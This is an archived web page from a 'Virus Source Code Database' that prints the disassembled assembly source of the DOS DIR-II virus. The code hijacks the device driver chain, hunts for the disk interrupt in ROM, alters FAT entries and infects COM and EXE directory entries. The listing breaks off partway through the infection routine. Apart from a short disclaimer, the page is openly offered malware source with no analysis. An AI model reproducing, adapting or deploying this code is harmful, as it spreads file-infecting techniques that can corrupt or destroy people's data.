<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: dir-ii_asm</title>
<meta name="KEYWORDS" content="dir-ii.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for dir-ii.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;  Disassembled virus : DIR-II
;  Target assembler   : TASM v1.0/2.0
;  Author             : Sajid Rahim
;  Organisation       : Systems Research Laboratories.
;  (c) Sajid Rahim
;        name    dir-ii_asm
;
;
dir_II segment byte public

SP_TOP          EQU     600h

        assume  cs:dir_II,ds:dir_II
	org	100h
adr_100:
        mov     sp,SP_TOP
        inc     word ptr inf_cnt
	xor	cx,cx
	mov	ds,cx
        lds     ax,dword ptr ds:[00C1h]
        add     ax,21h
	push	ds
        push    ax                      ;addr of 21h entry point + few instr.
        mov     ah,30h
        call    old_int21
        cmp     al,4                    ;version
        sbb     si,si                   ;si=0 for ver 4,5; FFFF for <4
        mov     byte ptr ds:[unit],0FFh        ;DS ?? CS !!

        mov     bx,0060h                ;vir=400, stack=200
        mov     ah,4Ah
        call    old_int21               ;shrink/expand memblock to vir+stack

        mov     ah,52h
        call    old_int21               ;list of lists
        push    word ptr es:[bx-2]      ;seg of root MCB
        lds     bx,dword ptr es:[bx]    ;address of first DPB=ds:bx
nextDPB:
        mov     ax,word ptr [bx+si+15h]         ;DPB+14 (DOS3), DPB+15 (4,5)
                                                ;get seg of device header
        cmp     ax,0070h
        jne     not_70
        xchg    ax,cx                           ;cx=70h
        mov     byte ptr [bx+si+18h],0FFh       ;access flag, FF-not accessed
        mov     di,word ptr [bx+si+13h]         ;get offset of device header ?
        mov     word ptr [bx+si+13h],OFFSET newheader
                                                ;set offset of device header
        mov     word ptr [bx+si+15h],cs         ;set seg of device header
not_70:
        lds     bx,dword ptr [bx+si+19h]        ;get addr of next DPB
        cmp     bx,-1                           ;last ?
        jne     nextDPB
        jcxz    on_int20
        pop     ds                              ;seg of root MCB
	mov	ax,ds
        add     ax,word ptr ds:[0003h]          ;memblock size
	inc	ax
	mov	dx,cs
	dec	dx
	cmp	ax,dx
        jne     not_vir_memblock
        add     word ptr ds:[0003h],61h         ;virus memblock size
not_vir_memblock:
	mov	ds,dx
        mov     word ptr ds:[0001h],0008h       ;owner=DOS
	mov	ds,cx
        les     ax,dword ptr [di+6]             ;ds=70h
        mov     word ptr cs:offs,ax             ;ofs(strategy)  (seg=70h)
        mov     word ptr cs:offi,es             ;ofs(interrupt) (seg=70h)
	cld	
        mov     si,1
no_call:
	dec	si
	lodsw	
        cmp     ax,1EFFh                ;opcode of "call far [..]"
        jne     no_call

        mov     ax,02CAh                ;retf 2
        cmp     word ptr [si+4],ax
        je      farcall                 ;searches for construction:
        cmp     word ptr [si+5],ax      ;       call far [..]
        jne     no_call                 ;       (2 bytes or 3 bytes)
farcall:                                ;       retf 2
        lodsw           ;fetch ptr of farcall dword
	push	cs
	pop	es
        mov     di,OFFSET ptr_on_dword
	stosw	
	xchg	ax,si	
        mov     di,SP_TOP-8
	cli	
        movsw                   ;copy dword addr of far call
        movsw

        mov     dx,0C000h               ;starting ROM extension segment
ROM_scan:
	mov	ds,dx
	xor	si,si
	lodsw	
        cmp     ax,0AA55h       ;ROM sign
        jne     not_ROM
        cbw             ;= xor ah,ah
        lodsb           ;size in 512 pages
        mov     cl,9    
        shl     ax,cl   ;pages -> bytes
search_intercept:
        cmp     word ptr [si],06C7h     ;mov word ptr [004c]
        jne     chk_ROM_limit
        cmp     word ptr [si+2],4Ch     ;[004c] = offset of int 13!
        jne     chk_ROM_limit
        push    dx                      ;addr of int 13 (seg)
        push    word ptr [si+4]         ;addr of int 13 (ofs)
        jmp     short free_env
on_int20:
	int	020h

buf:
        db      063h,03Ah,0ffh,0

chk_ROM_limit:
	inc	si
        cmp     si,ax           ;ax=sizeof(ROM)
        jb      search_intercept
not_ROM:
        inc     dx
        cmp     dh,0F0h         ;end of ROM scan ?
        jb      ROM_scan
        sub     sp,4            ;put 2 words on stack (as dx & word [si+4])
free_env:
	push	cs
	pop	ds
        mov     bx,word ptr ds:[002Ch]          ;seg of environment
	mov	es,bx
        mov     ah,49h                          ;free memblock
        call    old_int21
	xor	ax,ax
	test	bx,bx
        je      no_envseg
;scan environment to find exec name (after two zero bytes!) = ASCIIZ
        mov     di,1
scan_env:
	dec	di
	scasw	
        jne     scan_env
        lea     si,word ptr [di+2]              ;-> executed filename
        jmp     short si_name
no_envseg:
        mov     es,word ptr ds:[0016h]          ;DOS reserved area in PSP
        mov     bx,word ptr es:[0016h]
	dec	bx
        xor     si,si                           ;-> executed filename
si_name:
	push	bx
        mov     bx,OFFSET EPB           ;es:bx->EXEC parm block for DOS Exec
        mov     word ptr [bx+4],cs
        mov     word ptr [bx+8],cs
        mov     word ptr [bx+0Ch],cs
	pop	ds
	push	cs
	pop	es
        mov     di,OFFSET Bottom+22h
	push	di
        mov     cx,28h                  ;=80 bytes decimal
rep	movsw	
	push	cs
	pop	ds
        mov     ah,3Dh                  ;open
        mov     dx,OFFSET buf
        call    old_int21
        pop     dx                      ;OFFSET Bottom+22h (=522h)
        mov     ax,4B00h                ;execute
        call    old_int21
        mov     ah,4Dh                  ;wait (get ERRORLEVEL)
        call    old_int21
        mov     ah,4Ch                  ;terminate
old_int21:
	pushf	
        call    dword ptr cs:[SP_TOP-4]
        ret

int13_write:                    ;244h
        mov     ah,3                    ;int 13 write ?
        jmp     dword ptr cs:[SP_TOP-8]

Device_driver:                  ;24bh
	push	ax
	push	cx
	push	dx
	push	ds
	push	si
	push	di

	push	es
	pop	ds

        mov     al,byte ptr [bx+2]              ;function #
        cmp     al,4            ;read
        je      do_read
        cmp     al,8            ;write
        je      do_write
        cmp     al,9            ;write+verify
        je      do_write
        call    old_dev_drv
        cmp     al,2
        jne     pops_retf
;here if build BPB function
        lds     si,dword ptr [bx+12h]           ;addr of BPB for block device
        mov     di,OFFSET Bottom+2              ;0502h
        mov     word ptr es:[bx+12h],di         ;own BPB
        mov     word ptr es:[bx+14h],cs
	push	es
	push	cs
	pop	es
        mov     cx,10h
rep     movsw                                   ;copy BPB to 502
	pop	es
	push	cs
	pop	ds
        mov     al,byte ptr [di-1Eh]            ;sectors/cluster
        cmp     al,2
        adc     al,0    ;set al=2 if al=1 (0 impossible)
	cbw	
        cmp     word ptr [di-18h],0             ;total sectors/media
        je      dword_at_15                     ;=0 => dword at offset 15
        sub     word ptr [di-18h],ax            ;reduce media size
        jmp     short pops_retf
dword_at_15:
        sub     word ptr [di-0Bh],ax            ;reduce dword = (sect/media)
        sbb     word ptr [di-9],0
pops_retf:
	pop	di
	pop	si
	pop	ds
	pop	dx
	pop	cx
	pop	ax
_retf:
        retf

do_write:
	mov	cx,0FF09h
        call    unit_chk                ;not uses cx
        je      an_write
        call    old_dev_drv
        jmp     short common

an_write:
        jmp     from_write

an_read:
        jmp     from_read

go_out:
        add     sp,10h
        jmp     short pops_retf

do_read:
        call    unit_chk
        je      an_read
common:
        mov     byte ptr [bx+2],4       ;input
	cld	
        lea     si,word ptr [bx+0Eh]    ;DTA addr
        mov     cx,8
lodsw_push:
	lodsw	
	push	ax
        loop    lodsw_push

        mov     word ptr [bx+14h],1     ;starting sector
        call    old_1sec
        jnz     go_out
        mov     byte ptr [bx+2],2       ;build BPB
        call    old_dev_drv
        lds     si,dword ptr [bx+12h]   ;returned address of BPB
        mov     ax,word ptr [si+6]      ;max number of dir entries in root
        add     ax,000Fh
        mov     cl,4
	shr	ax,cl
        mov     di,word ptr [si+0Bh]    ;# of sectors in one FAT
        add     di,di                   ;in two FATs
	stc	
	adc	di,ax
	push	di
	cwd	
        mov     ax,word ptr [si+8]      ;total sectors in media (if 0->at 15)
	test	ax,ax
        jnz     media_le_32M
        mov     ax,word ptr [si+15h]    ;DOS 4.0 extension for >32M
        mov     dx,word ptr [si+17h]
media_le_32M:
	xor	cx,cx
	sub	ax,di
	sbb	dx,cx
        mov     cl,byte ptr [si+2]      ;sectors/cluster
	div	cx
        cmp     cl,2
	sbb	ax,0FFFFh
	push	ax
        call    Xscramble
        mov     byte ptr es:[bx+2],4    ;read
        mov     word ptr es:[bx+14h],ax ;starting sector number
        call    old_1sec
scan_FAT:
        lds     si,dword ptr es:[bx+0Eh]        ;addr of DTA
	add	si,dx
	sub	dh,cl
	adc	dx,ax
        mov     word ptr cs:Xmask,dx
        cmp     cl,1
        je      cl_is_1
	mov	ax,word ptr [si]
	and	ax,di
        cmp     ax,0FFF7h               ;bad cluster in FAT
        je      bad
        cmp     ax,00FF7h               ;---"---
        je      bad
        cmp     ax,0FF70h               ;---"---
        jne     not_bad
bad:
	pop	ax
	dec	ax
	push	ax
        call    Xscramble
        jmp     short scan_FAT
cl_is_1:
	not	di
	and	word ptr [si],di
	pop	ax
	push	ax
	inc	ax
	push	ax
        mov     dx,000Fh
	test	dx,di
        je      low_nibble
	inc	dx
	mul	dx
low_nibble:
	or	word ptr [si],ax
	pop	ax
        call    Xscramble
        mov     si,word ptr es:[bx+0Eh]         ;offset of DTA, ds=OK
	add	si,dx
	mov	ax,word ptr [si]
	and	ax,di
not_bad:
	mov	dx,di
	dec	dx
	and	dx,di
	not	di
	and	word ptr [si],di
	or	word ptr [si],dx
	cmp	ax,dx
	pop	ax
	pop	di
        mov     word ptr cs:Vclust,ax           ;put Vcluster to write in dir
        je      skip
	mov	dx,word ptr [si]
	push	ds
	push	si
        call    virtual
	pop	si
	pop	ds
        jne     skip
        call    old_1sec
	cmp	word ptr [si],dx
        jne     skip
	dec	ax
	dec	ax
	mul	cx
	add	ax,di
        adc     dx,0
	push	es
	pop	ds
        mov     word ptr [bx+12h],2             ;sector count
        mov     word ptr [bx+14h],ax            ;starting sector
	test	dx,dx
        je      less_32M
        mov     word ptr [bx+14h],0FFFFh        ;sign >32M => use dword at 1Ah
        mov     word ptr [bx+1Ah],ax            ;low word
        mov     word ptr [bx+1Ch],dx            ;hi word
less_32M:
        mov     word ptr [bx+10h],cs            ;addr of DTA (seg)
        mov     word ptr [bx+0Eh],100h          ;            (ofs)
        call    virtual
skip:
	std	
        lea     di,word ptr [bx+1Ch]            ;ptr -> hiword of size (>32M)
        mov     cx,8
pop_stosw:
	pop	ax
	stosw	
        loop    pop_stosw

from_read:
        call    old_dev_drv
        mov     cx,9
from_write:
        mov     di,word ptr es:[bx+12h]         ;sector count
        lds     si,dword ptr es:[bx+0Eh]        ;addr of DTA
	shl	di,cl
	xor	cl,cl
        add     di,si                   ;size to examine
        xor     dl,dl                   ;set zero dl (infect dir entry)
        push    ds                      ;save DTA
	push	si
        call    next_dir_entry
        jcxz    cx_0
        call    virtual
        and     byte ptr es:[bx+4],07Fh         ;clear error bit
cx_0:
        pop     si                      ;restore DTA
	pop	ds
        inc     dx                      ;set nonzero dl (uninfect dir entry)
        call    next_dir_entry
        jmp     pops_retf

next_dir_entry:
        mov     ax,word ptr [si+8]
        cmp     ax,05845h               ;XE
        jne     not_EX
        cmp     byte ptr [si+0Ah],al    ;E
        je      is_EXE
not_EX:
        cmp     ax,04F43h               ;OC
        jne     on_exit
        cmp     byte ptr [si+0Ah],4Dh   ;M
        jne     on_exit
is_EXE:
        test    word ptr [si+1Eh],0FFC0h        ;file size (hi)
        jne     on_exit
        test    word ptr [si+1Dh],3FF8h         ;file size (middle word!)
        je      on_exit
        test    byte ptr [si+0Bh],1Ch           ;attribute
